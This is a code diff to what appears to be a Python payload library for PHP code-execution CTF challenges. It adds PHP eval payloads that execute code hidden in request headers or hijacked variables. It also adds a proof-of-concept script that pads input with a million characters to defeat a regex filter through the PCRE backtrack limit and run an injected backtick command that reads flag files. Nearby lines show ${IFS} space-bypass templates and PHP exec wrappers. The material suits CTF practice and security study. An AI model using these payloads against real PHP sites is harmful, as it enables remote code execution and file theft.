@@ -91,6 +91,20 @@ VARIABLE_HIJACK_TEMPLATES = [
     "eval(array_pop(next(get_defined_vars())));",
 ]
 
+# 触发 UA 头提示
+HEADER_TIP_TRIGGER_PAYLOADS = {
+    "print_r(getallheaders());",
+    "eval(next(getallheaders()));",
+}
+
+VARIABLE_HIJACK_TIP_TRIGGER_PAYLOADS = {
+    "eval(array_pop(next(get_defined_vars())));",
+}
+
+HEADER_EXEC_TEMPLATES = [
+    "eval(next(getallheaders()));",
+]
+
 # 空格绕过
 SPACE_BYPASS_TEMPLATES = [
     "{payload}".replace(" ", "${IFS}"),
@@ -137,6 +151,15 @@ for i in range(1,20):
     if "flag" in res.text:
         print(res.text)
         break"""
+
+BACKTRACK_LIMIT_POC_EGS = """
+import requests
+
+url = ""
+payload = '{"cmd":"?><?=`sort /f*`?>","+":"' + "-" * 1000000 + '"}'
+res = requests.post(url=url, data={"letter": payload})
+print(res.text)
+"""
 
 PHP_EXEC_WRAPPERS = [
     "system",
